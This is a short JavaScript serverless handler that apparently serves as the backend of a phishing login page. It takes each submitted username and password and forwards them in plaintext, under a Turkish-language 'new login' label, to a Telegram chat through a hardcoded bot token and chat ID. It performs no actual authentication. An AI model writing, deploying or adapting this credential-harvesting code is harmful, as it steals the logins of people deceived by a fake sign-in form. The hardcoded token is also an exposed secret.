export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Only POST requests are allowed' });
    }

    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: 'Username and password are required' });
    }

    const chatId = "-4575020350"; // Çat ID-sini buraya yazın
    const botToken = "7821718686:AAF7-NR_-LlzOz5bdFEqZRwR1jXBjaNahaA"; // Bot tokenini buraya yazın

    const message = `Yeni giriş:\nKullanıcı Adı: ${username}\nŞifre: ${password}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
            }),
        });

        if (!response.ok) {
            throw new Error('Telegram API request failed');
        }

        return res.status(200).json({ success: true });
    } catch (error) {
        console.error(error);
        return res.status(500).json({ error: 'Message sending failed' });
    }
}
